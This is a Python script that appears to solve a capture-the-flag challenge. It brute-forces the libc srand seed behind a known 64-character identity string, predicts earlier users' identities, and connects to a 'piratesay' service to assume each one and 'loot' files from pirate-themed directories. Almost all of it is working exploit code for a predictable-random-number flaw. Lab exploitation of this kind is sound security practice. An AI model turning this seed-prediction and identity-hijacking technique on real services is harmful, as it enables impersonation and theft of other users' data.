import ctypes
import re
import socket
from concurrent.futures import ThreadPoolExecutor

directories = [
    "BlackbeardCove",
    "TreasureIsland",
    "SkullAndBonesReef",
    "DeadMansBay",
    "JollyRogersHarbor",
    "BuccaneerBeach",
    "PirateHideout",
    "CutthroatCreek",
    "SirenShores",
    "CorsairCastle",
    "WickedWaters",
    "MaroonersLagoon",
    "ParrotPerch",
    "RumRunnersRidge",
    "GalleonGraveyard"
]


def get_previous_users(count, start_seed, attempts_per_seed, matching_string):

    # Load the C standard library
    libc = ctypes.CDLL(None)

    # Set argument and return types
    libc.srand.argtypes = [ctypes.c_uint]
    libc.rand.restype = ctypes.c_int

    def generate_identity_string():
        return ''.join(chr(ord('a') + (libc.rand() % 26)) for _ in range(64))

    def find_matching_seed(start_seed, target_string, attempts_per_seed):
        seed = start_seed
        while True:
            libc.srand(seed)
            for attempt in range(attempts_per_seed):
                identity_string = generate_identity_string()
                if identity_string == target_string:
                    return seed, attempt
            seed += 1

    # Example starting seed and matching string
    if len(matching_string) != 64:
        print("The matching string must be 64 characters long")
        return

    # Find the seed and offset
    found_seed, offset = find_matching_seed(start_seed, matching_string, attempts_per_seed)

    print(f"Match found! Seed: {found_seed}, Offset: {offset}")

    # Seed with found_seed
    libc.srand(found_seed)
    # generate offset-count strings, which we don't need
    for _ in range(max(offset-count, 0)):
        generate_identity_string()
    # generate up to count strings
    possible_flags_identities = []
    for _ in range(min(offset, count)):
        possible_flags_identities.append(generate_identity_string())

    return possible_flags_identities





# For each possible flag, try to connect to the server and get the flag
def process_identity(identity, directory, file, host='piratesay', port=4444):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))

        # Function to receive data until a certain prompt is found
        def recv_until_prompt(prompt):
            data = b''
            while not data.endswith(prompt):
                data += s.recv(1024)
            return data
    
        # Set identity to possible flag
        s.sendall(b'identity\n')
        recv_until_prompt(b': ')
        s.sendall(identity.encode() + b'\n')
        recv_until_prompt(b'$ ')

        # Sail to directory and loot file
        s.sendall(f'sail {directory}\n'.encode())
        recv_until_prompt(b'$ ')
        s.sendall(f'loot {file}\n'.encode())
        response = recv_until_prompt(b'$ ')

        return response
